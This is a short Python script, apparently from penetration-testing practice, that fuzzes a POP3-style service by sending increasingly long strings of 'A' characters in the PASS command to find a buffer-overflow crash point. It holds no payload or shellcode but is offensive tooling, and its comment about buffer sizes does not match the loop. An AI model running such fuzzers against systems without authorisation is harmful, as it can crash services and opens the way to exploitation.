#!/usr/bin/python
import socket
import sys
from time import sleep
# Create an array of buffers, from 1 to 5900, with increments of 200.

buffer=["A"]
counter=100
host=str(sys.argv[1])
port=int(sys.argv[2])

print ("made by c0mstr3am")
if len(sys.argv)!=3:
	print("Usage: ./fuzzer.py IP PORT")
	sleep(1)
	exit(0)
else:
	pass
#lenght 30
while len(buffer) <= 30:
	buffer.append("A"*counter)
	counter=counter+200
for string in buffer:
	print "Fuzzing PASS with %s bytes" % len(string)
	s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	#connect=s.connect(('10.11.25.13',110))
	connect=s.connect((host,port))
	s.recv(1024)
	s.send('USER test\r\n')
	s.recv(1024)
	s.send('PASS ' + string + '\r\n')
	s.send('QUIT\r\n')
	s.close()
